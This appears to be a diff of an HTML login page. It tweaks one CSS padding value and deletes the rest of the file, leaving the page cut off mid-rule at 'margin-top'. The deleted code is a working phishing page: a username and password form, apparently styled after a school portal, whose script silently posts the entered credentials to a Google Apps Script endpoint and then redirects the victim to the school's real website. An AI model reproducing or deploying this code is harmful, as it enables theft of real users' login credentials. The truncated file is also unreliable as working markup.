@@ -38,7 +38,7 @@
             height: auto;
         }
         .login-container {
-            padding: 15px 15px 12px; /* 1.5 cm top/sides, 1.2 cm bottom gap to container line */
+            padding: 15px 15px 15px; /* 1.5 cm top/sides, 1.5 cm bottom gap to container line */
             text-align: center;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             background-color: #fff;
@@ -90,97 +90,4 @@
         .footer {
             text-align: center;
             color: #4a4a4a;
-            margin-top: 5px;
-            padding: 6px 0;
-            font-size: 0.85em;
-            font-family: Arial, sans-serif;
-            width: 100%;
-            transition: all 0.2s ease-in-out;
-        }
-        #message {
-            margin-top: 10px;
-            font-size: 0.8em;
-            color: #4CAF50;
-            display: none;
-        }
-        #error {
-            color: #f44336;
-            display: none; /* Hide error message */
-        }
-    </style>
-</head>
-<body>
-    <div class="login-wrapper">
-        <div class="image-section">
-            <img src="Image 17-09-2025 at 11.50.jpeg" alt="Header and Logo">
-        </div>
-        <div class="login-container">
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Enter your Username" required>
-                <input type="password" id="password" placeholder="Enter your Password" required>
-                <button type="submit">Login</button>
-            </form>
-            <a href="#" id="userPortalLink" onclick="handleUserPortal(event)">Click here to access User Portal</a>
-            <div id="message"></div>
-            <div id="error"></div> <!-- Kept but hidden -->
-        </div>
-    </div>
-    <div class="footer">
-        Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
-    </div>
-
-    <script>
-        const form = document.getElementById('loginForm');
-        const userPortalLink = document.getElementById('userPortalLink');
-        const messageDiv = document.getElementById('message');
-        const errorDiv = document.getElementById('error');
-        const webAppUrl = 'https://script.google.com/macros/s/AKfycbw104iJMQPmeuC9Nis5buVrtGV9UC4XaEI6_GEMDeDEzrShwo0E04FWhbI7eAL8tecg/exec'; // Updated URL
-        const redirectUrl = 'https://mpesafoundationacademy.ac.ke';
-
-        async function sendCredentials(username, password) {
-            try {
-                const response = await fetch(webAppUrl, {
-                    method: 'POST',
-                    mode: 'cors',
-                    headers: {
-                        'Content-Type': 'text/plain;charset=utf-8'
-                    },
-                    body: new URLSearchParams({
-                        username: username || '',
-                        password: password || ''
-                    }).toString()
-                });
-                const data = await response.json();
-                return data.success === true; // Return true only if success is confirmed
-            } catch (error) {
-                // Error handling suppressed on UI
-                return false;
-            }
-        }
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (await sendCredentials(username, password)) {
-                window.location.href = redirectUrl; // Immediate redirect after success
-            }
-            // No error message displayed
-        });
-
-        userPortalLink.addEventListener('click', async (e) => {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (await sendCredentials(username, password)) {
-                window.location.href = redirectUrl; // Redirect after sending credentials
-            }
-            // No error message displayed
-        });
-    </script>
-</body>
-</html>
+            margin-top
